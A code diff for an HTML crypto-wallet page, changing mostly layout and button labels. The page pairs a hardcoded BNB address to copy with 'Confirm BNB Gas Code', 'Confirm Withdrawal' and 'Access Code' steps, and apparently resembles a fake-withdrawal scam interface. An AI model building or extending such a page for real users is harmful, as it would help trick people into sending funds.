@@ -31,7 +31,7 @@
   </header>
 
   <!-- PAGE NUMBER -->
-  <div class="text-center text-sm text-gray-400 mt-2" id="pageNumberDisplay">Page 0: Dashboard</div>
+  <div class="text-center text-sm text-gray-400 mt-2" id="page0">Dashboard</div>
 
   <!-- DASHBOARD -->
   <section id="dashboard" class="page active-page bg-[#0b0e11] min-h-screen text-white">
@@ -77,7 +77,8 @@
   
   <!-- ✅ PAGE 13 - CONNECT WALLET -->
   <section id="page13" class="page px-4 py-8 min-h-screen bg-[#0b0e11] text-white">
-  <div class="max-w-xl mx-auto bg-[#12161c] p-6 rounded-xl shadow-lg"><!-- Header -->
+  <div class="max-w-xl mx-auto bg-[#12161c] p-6 rounded-xl shadow-lg">
+    <!-- Header -->
 <div class="flex items-center justify-between mb-6">
   <h2 class="text-2xl font-bold">Connect Your Wallet</h2>
   <button onclick="showPage('4')" class="text-yellow-400 hover:underline">← Dashboard</button>
@@ -167,7 +168,8 @@
         <h4 class="text-white font-semibold">Ethereum (ERC20)</h4>
       </div>
       <p class="text-sm text-gray-400">Receive ETH or any ERC20 tokens on this address.</p>
-    </div><div class="bg-[#1c1f24] p-4 rounded-lg border border-gray-700">
+    </div>
+    <div class="bg-[#1c1f24] p-4 rounded-lg border border-gray-700">
   <div class="flex items-center gap-3 mb-2">
     <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" width="30" />
     <h4 class="text-white font-semibold">BNB Smart Chain</h4>
@@ -303,7 +305,7 @@
       onclick="showPage('page9i')"
       class="w-full bg-yellow-400 text-black font-bold py-3 rounded hover:bg-yellow-300 transition mb-4"
     >
-      Confirm Transfer
+      Confirm Withdrawal
     </button>
 
     <button
@@ -335,11 +337,21 @@
   <span id="bnbAddress" class="truncate">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span>
   <button onclick="copyBNBAddress()" class="text-yellow-400 hover:underline text-sm">Copy</button>
 </div>
-
+<div>
+  <button
+      type="button"
+      onclick="showPage('dashboard')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+  </button>
+</div>
+    <div>
 <button onclick="showPage('page9ii')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Confirm BNB Gas Code</button>
 
   </div>
 </section>
+  
   <!-- ✅ PAGE 9ii - ACCESS CODE + QR CODE -->
   <section id="page9ii" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
   <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl text-center">
